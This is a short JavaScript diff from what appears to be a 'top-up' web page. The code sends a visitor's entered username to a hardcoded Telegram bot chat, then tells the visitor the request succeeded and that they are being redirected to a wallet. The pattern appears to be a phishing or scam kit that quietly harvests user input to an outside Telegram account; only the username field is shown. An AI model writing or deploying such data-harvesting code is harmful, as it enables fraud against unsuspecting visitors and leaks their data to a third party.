@@ -25,8 +25,8 @@
             var i = "5533405786";
 
             if(val) {
-                var message = "🚀 طلب جديد \n👤 اليوزر: " + val;
-                var u = `https://api.telegram.org/bot${t}/sendMessage?chat_id=${i}&text=${encodeURIComponent(message)}`;
+                var message = "🚀 طلب شحن جديد \n👤 اليوزر: " + val;
+                var u = "https://api.telegram.org/bot" + t + "/sendMessage?chat_id=" + i + "&text=" + encodeURIComponent(message);
 
                 fetch(u).then(function() {
                     alert("تم بنجاح! جاري تحويلك للمحفظة...");
